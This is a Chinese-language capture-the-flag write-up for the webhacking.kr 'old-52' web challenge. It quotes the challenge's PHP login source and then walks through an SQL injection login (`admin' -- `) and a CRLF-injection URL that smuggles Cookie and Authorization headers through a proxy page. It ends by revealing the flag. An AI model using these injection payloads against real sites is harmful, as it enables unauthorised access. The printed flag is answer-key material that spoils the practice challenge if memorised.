# old-52_400

* 這一題一進去就清楚的告訴我們要進到 admin page 中，還有什麼 proxy 的東東，是一個大伏筆，出這一題的是一個狠人 ...
* 先在 admin page 中登入 `guest/guest` 發現沒什麼有用的資訊
* 於是 logout 之後按了 cancel 可以看到 login failed 以及 source code
    ```php=
    include "config.php";
    if($_GET['view_source']) view_source();
    if($_GET['logout'] == 1){
      $_SESSION['login']="";
      exit("<script>location.href='./';</script>");
    }
    if($_SESSION['login']){
      echo "hi {$_SESSION['login']}<br>";
      if($_SESSION['login'] == "admin"){
        if(preg_match("/^172\.17\.0\./",$_SERVER['REMOTE_ADDR'])) echo $flag;
        else echo "Only access from virtual IP address";
      }
      else echo "You are not admin";
      echo "<br><a href=./?logout=1>[logout]</a>";
      exit;
    }
    if(!$_SESSION['login']){
      if(preg_match("/logout=1/",$_SERVER['HTTP_REFERER'])){
        header('WWW-Authenticate: Basic realm="Protected Area"');
        header('HTTP/1.0 401 Unauthorized');
      }
      if($_SERVER['PHP_AUTH_USER']){
        $id = $_SERVER['PHP_AUTH_USER'];
        $pw = $_SERVER['PHP_AUTH_PW'];
        $pw = md5($pw);
        $db = dbconnect();
        $query = "select id from member where id='{$id}' and pw='{$pw}'";
        $result = mysqli_fetch_array(mysqli_query($db,$query));
        if($result['id']){
          $_SESSION['login'] = $result['id'];
          exit("<script>location.href='./';</script>");
        }
      }
      if(!$_SESSION['login']){
        header('WWW-Authenticate: Basic realm="Protected Area"');
        header('HTTP/1.0 401 Unauthorized');
        echo "Login Fail";
      }
    }
    ```
* 先分析一下 sql 的部分，可以發現是一個非常簡單的 sql injection，注入點在 id 的地方，於是回到 admin page 中 login 一下 `admin' -- /123` 可以發現有了以下的資訊
    ```
    hi admin
    Only access from virtual IP address
    ```
* 再看到 source code 可以發現如果我們成功登入了 admin 還有一個條件我們才能拿到 flag，條件就是 remote address 滿足 regular expression
* 如果直接看的話這簡直就是不可能的事 ... 查了一下 remote address : 可能是用户真实IP也可能是代理IP ... 代理 IP！？！？
* 這時看到 proxy，原來這就是為什麼會有這一個莫名的東東在這裡的原因拉
* 訪問 `http://webhacking.kr:10008/proxy.php?page=/admin/` 可以得到
    ```
    Request
    GET /admin/ HTTP/1.1
    Host: webhacking.kr:10008
    Connection: Close


    Response
    HTTP/1.0 401 Unauthorized
    Date: Sun, 12 Jul 2020 12:50:15 GMT
    Server: Apache/2.4.29 (Ubuntu)
    Set-Cookie: PHPSESSID=9pimvgugsd2a8t372n26bnd2qt; path=/
    Expires: Thu, 19 Nov 1981 08:52:00 GMT
    Cache-Control: no-store, no-cache, must-revalidate
    Pragma: no-cache
    WWW-Authenticate: Basic realm="Protected Area"
    Content-Length: 55
    Connection: close
    Content-Type: text/html; charset=UTF-8

    Login Fail
    view-source
    ```
* 在這裡可以發現，我們唯一可控的地方在 page 這個 param 上，而他控制的地方在 
    `GET /admin/ ` 所以想到 crlf injection `%0d%0a`
* 現在的問題是，要新增什麼樣的資訊讓 admin page 透過這個 proxy 吐出 flag
* 稍微折騰了一下，必要的有 `Authorization: Basic ` 以及 `Cookie: PHPSESSID=your_phpsessid`
* 所以訪問 `http://webhacking.kr:10008/proxy.php?page=/admin/+HTTP/1.1%0d%0aCookie:+PHPSESSID=your_phpsessid%0d%0aAuthorization:+Basic+YWRtaW4nIC0tIDoxMjM=%0d%0a` 就可以拿到 flag 拉
* flag : FLAG{Server_Side_Request_Forgery_with_proxy!}
